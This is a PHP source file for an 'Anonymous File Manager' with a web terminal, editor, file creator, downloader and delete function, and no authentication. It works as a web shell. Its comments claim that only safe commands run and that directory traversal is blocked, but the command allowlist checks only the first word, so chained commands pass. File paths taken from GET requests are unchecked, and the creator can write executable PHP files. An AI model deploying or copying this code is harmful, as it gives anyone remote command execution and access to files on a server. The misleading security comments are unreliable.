<?php
// Simple File Manager with Terminal
// Warning: This script is for local/private use only!

session_start();
if (!isset($_SESSION['current_path'])) {
    $_SESSION['current_path'] = realpath('.');
}

$current_path = $_SESSION['current_path'];

// Security: Prevent directory traversal
$base_path = realpath('.');
if (strpos($current_path, $base_path) !== 0) {
    $current_path = $base_path;
}

chdir($current_path);

// Handle POST actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Change directory
    if (isset($_POST['cd'])) {
        $new_dir = trim($_POST['cd_path']);
        if ($new_dir === '~' || $new_dir === '') {
            $current_path = $base_path;
        } elseif (is_dir($new_dir)) {
            $current_path = realpath($new_dir);
        } elseif (is_dir($current_path . '/' . $new_dir)) {
            $current_path = realpath($current_path . '/' . $new_dir);
        } else {
            $error = "Directory not found: $new_dir";
        }
        $_SESSION['current_path'] = $current_path;
    }
    
    // Create new file
    if (isset($_POST['create_file'])) {
        $filename = trim($_POST['filename']);
        $content = $_POST['file_content'] ?? '';
        if ($filename && !file_exists($filename)) {
            file_put_contents($filename, $content);
            $message = "File created: $filename";
        } elseif (file_exists($filename)) {
            $error = "File already exists: $filename";
        }
    }
    
    // Save edited file
    if (isset($_POST['save_file'])) {
        $edit_file = $_POST['edit_file'];
        $content = $_POST['file_content'];
        if (file_exists($edit_file)) {
            file_put_contents($edit_file, $content);
            $message = "File saved: $edit_file";
        }
    }
    
    // Terminal command execution
    if (isset($_POST['terminal_cmd'])) {
        $cmd = trim($_POST['command']);
        if (!empty($cmd)) {
            // Security: Allow only safe commands
            $allowed_cmds = ['ls', 'pwd', 'whoami', 'date', 'uname', 'mkdir', 'rmdir', 'touch', 'cat', 'echo'];
            $cmd_parts = explode(' ', $cmd);
            $base_cmd = $cmd_parts[0];
            
            if (in_array($base_cmd, $allowed_cmds)) {
                $output = [];
                $return_var = 0;
                exec($cmd . " 2>&1", $output, $return_var);
                $terminal_output = implode("\n", $output);
            } else {
                $terminal_output = "Command not allowed: $base_cmd";
            }
        }
    }
}

// Handle GET actions
if (isset($_GET['action'])) {
    // Change directory via link
    if ($_GET['action'] === 'cd' && isset($_GET['path'])) {
        $new_path = $current_path . '/' . $_GET['path'];
        if (is_dir($new_path)) {
            $current_path = realpath($new_path);
            $_SESSION['current_path'] = $current_path;
        }
    }
    
    // Edit file
    if ($_GET['action'] === 'edit' && isset($_GET['file'])) {
        $edit_file = $_GET['file'];
        if (file_exists($edit_file) && is_file($edit_file)) {
            $file_content = htmlspecialchars(file_get_contents($edit_file));
            $editing = true;
        }
    }
    
    // Delete file
    if ($_GET['action'] === 'delete' && isset($_GET['file'])) {
        $del_file = $_GET['file'];
        if (file_exists($del_file) && is_file($del_file)) {
            unlink($del_file);
            $message = "File deleted: $del_file";
        }
    }
    
    // Download file
    if ($_GET['action'] === 'download' && isset($_GET['file'])) {
        $file = $_GET['file'];
        if (file_exists($file) && is_file($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        }
    }
}

// Get directory listing
$dirs = [];
$files = [];
$items = scandir($current_path);

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    
    $full_path = $current_path . '/' . $item;
    if (is_dir($full_path)) {
        $dirs[] = [
            'name' => $item,
            'path' => $full_path,
            'size' => '-',
            'modified' => date('Y-m-d H:i:s', filemtime($full_path))
        ];
    } else {
        $files[] = [
            'name' => $item,
            'path' => $full_path,
            'size' => format_size(filesize($full_path)),
            'modified' => date('Y-m-d H:i:s', filemtime($full_path))
        ];
    }
}

// Helper function to format file size
function format_size($size) {
    $units = ['B', 'KB', 'MB', 'GB'];
    $i = 0;
    while ($size >= 1024 && $i < count($units) - 1) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anonymous File Manager</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Consolas', 'Monaco', monospace;
            background: #0d1117;
            color: #c9d1d9;
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #161b22;
            border-radius: 8px;
            padding: 20px;
            border: 1px solid #30363d;
        }
        
        h1 {
            color: #58a6ff;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #30363d;
        }
        
        .terminal-output {
            background: #000;
            color: #0f0;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #30363d;
        }
        
        .path-display {
            background: #21262d;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            border: 1px solid #30363d;
        }
        
        .file-list {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 10px;
            margin: 20px 0;
        }
        
        .file-item {
            background: #21262d;
            padding: 15px;
            border-radius: 5px;
            border: 1px solid #30363d;
            transition: all 0.3s;
        }
        
        .file-item:hover {
            background: #30363d;
            border-color: #58a6ff;
        }
        
        .file-item.dir {
            border-color: #238636;
        }
        
        .file-actions {
            margin-top: 10px;
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }
        
        .btn {
            background: #238636;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
            font-size: 12px;
            transition: background 0.3s;
        }
        
        .btn:hover {
            background: #2ea043;
        }
        
        .btn-danger {
            background: #da3633;
        }
        
        .btn-danger:hover {
            background: #f85149;
        }
        
        .btn-info {
            background: #1f6feb;
        }
        
        .btn-info:hover {
            background: #58a6ff;
        }
        
        .form-group {
            margin: 15px 0;
        }
        
        input[type="text"],
        textarea {
            width: 100%;
            padding: 10px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 5px;
            color: #c9d1d9;
            font-family: 'Consolas', monospace;
        }
        
        textarea {
            min-height: 200px;
            resize: vertical;
        }
        
        .tabs {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }
        
        .tab-btn {
            padding: 10px 20px;
            background: #21262d;
            border: 1px solid #30363d;
            border-radius: 5px 5px 0 0;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .tab-btn.active {
            background: #1f6feb;
            border-color: #1f6feb;
        }
        
        .tab-content {
            display: none;
            padding: 20px;
            background: #21262d;
            border-radius: 0 5px 5px 5px;
            border: 1px solid #30363d;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .message {
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
        }
        
        .success {
            background: #238636;
            color: white;
        }
        
        .error {
            background: #da3633;
            color: white;
        }
        
        .quick-commands {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 10px;
            margin: 10px 0;
        }
        
        .command-btn {
            background: #21262d;
            border: 1px solid #30363d;
            color: #c9d1d9;
            padding: 8px;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .command-btn:hover {
            background: #1f6feb;
            border-color: #1f6feb;
        }
        
        .file-meta {
            font-size: 12px;
            color: #8b949e;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 Anonymous File Manager</h1>
        
        <?php if (isset($message)): ?>
            <div class="message success"><?php echo htmlspecialchars($message); ?></div>
        <?php endif; ?>
        
        <?php if (isset($error)): ?>
            <div class="message error"><?php echo htmlspecialchars($error); ?></div>
        <?php endif; ?>
        
        <div class="path-display">
            <strong>Current Path:</strong> <?php echo htmlspecialchars($current_path); ?>
        </div>
        
        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('files')">📁 Files</button>
            <button class="tab-btn" onclick="switchTab('editor')">✏️ Editor</button>
            <button class="tab-btn" onclick="switchTab('terminal')">💻 Terminal</button>
            <button class="tab-btn" onclick="switchTab('create')">➕ Create</button>
        </div>
        
        <!-- Files Tab -->
        <div id="files" class="tab-content active">
            <div class="file-list">
                <?php foreach ($dirs as $dir): ?>
                    <div class="file-item dir">
                        <strong>📁 <?php echo htmlspecialchars($dir['name']); ?></strong>
                        <div class="file-meta">
                            Modified: <?php echo $dir['modified']; ?><br>
                            Type: Directory
                        </div>
                        <div class="file-actions">
                            <a href="?action=cd&path=<?php echo urlencode($dir['name']); ?>" class="btn">Open</a>
                        </div>
                    </div>
                <?php endforeach; ?>
                
                <?php foreach ($files as $file): ?>
                    <div class="file-item">
                        <strong>📄 <?php echo htmlspecialchars($file['name']); ?></strong>
                        <div class="file-meta">
                            Size: <?php echo $file['size']; ?><br>
                            Modified: <?php echo $file['modified']; ?>
                        </div>
                        <div class="file-actions">
                            <a href="?action=edit&file=<?php echo urlencode($file['name']); ?>" class="btn">Edit</a>
                            <a href="?action=download&file=<?php echo urlencode($file['name']); ?>" class="btn btn-info">Download</a>
                            <a href="?action=delete&file=<?php echo urlencode($file['name']); ?>" 
                               onclick="return confirm('Delete <?php echo htmlspecialchars($file['name']); ?>?')"
                               class="btn btn-danger">Delete</a>
                        </div>
                    </div>
                <?php endforeach; ?>
            </div>
            
            <form method="post" class="form-group">
                <h3>Change Directory</h3>
                <input type="text" name="cd_path" placeholder="Enter directory path or ~ for root">
                <button type="submit" name="cd" class="btn" style="margin-top: 10px;">Change Directory</button>
            </form>
        </div>
        
        <!-- Editor Tab -->
        <div id="editor" class="tab-content">
            <?php if (isset($editing) && $editing): ?>
                <h3>Editing: <?php echo htmlspecialchars($edit_file); ?></h3>
                <form method="post">
                    <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($edit_file); ?>">
                    <textarea name="file_content"><?php echo $file_content; ?></textarea>
                    <button type="submit" name="save_file" class="btn">Save File</button>
                    <a href="?" class="btn btn-danger">Cancel</a>
                </form>
            <?php else: ?>
                <p>Select a file to edit from the Files tab.</p>
            <?php endif; ?>
        </div>
        
        <!-- Terminal Tab -->
        <div id="terminal" class="tab-content">
            <h3>Web Terminal</h3>
            <div class="quick-commands">
                <button class="command-btn" onclick="setCommand('ls -la')">ls -la</button>
                <button class="command-btn" onclick="setCommand('pwd')">pwd</button>
                <button class="command-btn" onclick="setCommand('whoami')">whoami</button>
                <button class="command-btn" onclick="setCommand('date')">date</button>
                <button class="command-btn" onclick="setCommand('mkdir new_folder')">mkdir</button>
                <button class="command-btn" onclick="setCommand('touch new_file.txt')">touch</button>
            </div>
            
            <form method="post">
                <input type="text" name="command" id="commandInput" placeholder="Enter command..." autocomplete="off">
                <button type="submit" name="terminal_cmd" class="btn" style="margin-top: 10px;">Execute</button>
            </form>
            
            <?php if (isset($terminal_output)): ?>
                <div class="terminal-output">
                    <strong>$ <?php echo htmlspecialchars($cmd ?? ''); ?></strong><br><br>
                    <?php echo nl2br(htmlspecialchars($terminal_output)); ?>
                </div>
            <?php endif; ?>
        </div>
        
        <!-- Create Tab -->
        <div id="create" class="tab-content">
            <h3>Create New File</h3>
            <form method="post">
                <div class="form-group">
                    <label>Filename:</label>
                    <input type="text" name="filename" placeholder="example.php" required>
                </div>
                
                <div class="form-group">
                    <label>Content:</label>
                    <textarea name="file_content" placeholder="Enter file content..."></textarea>
                </div>
                
                <div class="form-group">
                    <button type="submit" name="create_file" class="btn">Create File</button>
                </div>
            </form>
            
            <div style="margin-top: 20px; padding: 15px; background: #21262d; border-radius: 5px;">
                <h4>Quick Templates:</h4>
                <button class="btn" onclick="setTemplate('php', '<?php echo htmlspecialchars("<?php\n// PHP file\necho \"Hello World!\";\n?>"); ?>')">PHP File</button>
                <button class="btn" onclick="setTemplate('html', '<?php echo htmlspecialchars("<!DOCTYPE html>\n<html>\n<head>\n    <title>Document</title>\n</head>\n<body>\n    \n</body>\n</html>"); ?>')">HTML File</button>
                <button class="btn" onclick="setTemplate('js', '<?php echo htmlspecialchars("// JavaScript file\nconsole.log(\"Hello World!\");"); ?>')">JS File</button>
                <button class="btn" onclick="setTemplate('txt', '<?php echo htmlspecialchars("Text file content"); ?>')">Text File</button>
            </div>
        </div>
    </div>

    <script>
        function switchTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Remove active class from all buttons
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById(tabName).classList.add('active');
            
            // Mark button as active
            event.target.classList.add('active');
        }
        
        function setCommand(cmd) {
            document.getElementById('commandInput').value = cmd;
        }
        
        function setTemplate(type, content) {
            const extensions = {
                'php': '.php',
                'html': '.html',
                'js': '.js',
                'txt': '.txt'
            };
            
            document.querySelector('input[name="filename"]').value = 'new_file' + (extensions[type] || '');
            document.querySelector('textarea[name="file_content"]').value = content;
            
            // Switch to create tab
            switchTab('create');
        }
        
        // Auto-focus command input on terminal tab
        document.addEventListener('DOMContentLoaded', function() {
            const tabBtns = document.querySelectorAll('.tab-btn');
            tabBtns.forEach(btn => {
                btn.addEventListener('click', function() {
                    if (this.textContent.includes('Terminal')) {
                        setTimeout(() => {
                            document.getElementById('commandInput').focus();
                        }, 100);
                    }
                });
            });
        });
    </script>
</body>
</html>